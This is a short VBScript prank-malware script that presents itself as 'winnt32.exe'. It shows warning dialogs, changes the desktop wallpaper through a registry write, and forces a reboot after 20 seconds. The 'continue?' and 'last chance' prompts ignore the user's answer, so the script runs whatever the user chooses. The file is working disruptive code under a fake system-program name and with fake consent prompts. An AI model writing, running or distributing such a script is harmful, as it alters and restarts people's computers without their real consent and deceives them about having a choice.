X=MsgBox("This Malware Is No Joke Continue?",3+64,"winnt32.exe")

X=MsgBox("Processes are running...",0+64,"winnt32.exe")

X=MsgBox("THIS IS YOUR LAST CHANCE DO YOU WANT TO RUN THIS MALWARE",3+64,"winnt32.exe")

dim wshShell
dim sUserName

Set wshShell = WScript.CreateObject("WScript.Shell")
sUserName = wshShell.ExpandEnvironmentStrings("%USERNAME%")

Set oShell = CreateObject("WScript.Shell")
Set oFSO = CreateObject("Scripting.FileSystemObject")

sWinDir = oFSO.GetSpecialFolder(0)
sWallPaper = "D:\noescapewallpaper.jpg"

' update in registry
oShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", sWallPaper

' let the system know about the change
oShell.Run "%windir%\System32\RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters", 1, True

Do
msgbox "Payload 1 Compeleted"
Loop until 1

CreateObject("WScript.Shell").Run "shutdown.exe -r -t 20"